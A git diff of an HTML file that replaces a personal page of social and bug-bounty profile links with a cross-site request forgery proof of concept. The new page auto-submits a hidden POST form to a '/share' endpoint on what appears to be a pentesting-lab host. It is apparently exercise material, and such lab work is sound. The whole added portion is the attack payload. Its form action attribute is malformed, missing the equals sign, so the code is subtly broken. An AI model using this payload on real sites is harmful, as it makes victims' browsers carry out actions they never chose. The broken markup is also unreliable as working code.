@@ -1,26 +1,11 @@
 <html>
 
-<head>
-
-<link rel="stylesheet" type="text/css" href="style.css">
-
-
-</head>
-
-<body>
-	<center>
-        <div id="icon"> 
-        <a href="https://twitter.com/evanricafort"  target="_blank" title="Twitter Profile"><img src="http://evanricafort.com/socialicons/twitter.png" width="20" /><span>Twitter</span></a> 
-        <a href="https://instagram.com/evanricafort"  target="_blank" title="Instagram Profile"><img src="http://evanricafort.com/socialicons/instragram.png" width="18" /></a> 
-        <a href="https://facebook.com/evanricafort" target="_blank" title="Facebook Profile"><img src="http://evanricafort.com/socialicons/facebook.png"  width="18" /></a>
-        <a href="https://www.linkedin.com/in/evanricafort"  target="_blank" title="LinkedIn Profile"><img src="http://evanricafort.com/socialicons/linkedin.png" width="18" /></a>
-        <a href="https://soundcloud.com/evanricafortmusic"  target="_blank" title="Soundcloud Profile"><img src="http://evanricafort.com/socialicons/soundcloud.png" width="18" /></a>
-        <a href="https://bugcrowd.com/evanricafort"  target="_blank" title="Bugcrowd Profile"><img src="http://evanricafort.com/socialicons/bugcrowd.png" width="18" /></a>
-        <a href="https://hackerone.com/evanricafort" target="_blank" title="Hackerone Profile"><img src="http://evanricafort.com/socialicons/h1.png" width="9" /></a>
-        <a href="https://www.cobalt.io/evanricafort"  target="_blank" title="Cobalt Profile"><img src="http://evanricafort.com/socialicons/cobalt.png" width="15" /></a>
-        <a href="http://evanricafort.com/blog/"  target="_blank" title="Blog"><img src="http://evanricafort.com/socialicons/blogger.png" width="18" /></a>
-      </div>
-
-</body>
+	<body onload="document.getElementById('csrf').submit()">
+	
+		<form action"http://ptl-0bd31592-9b563f57.libcurl.so/share" method=POST id=csrf>
+			<input type=hidden name=user value="test" />
+			<input type=hidden name=id value="0" />
+		</form>
+	</body>
 
 </html>
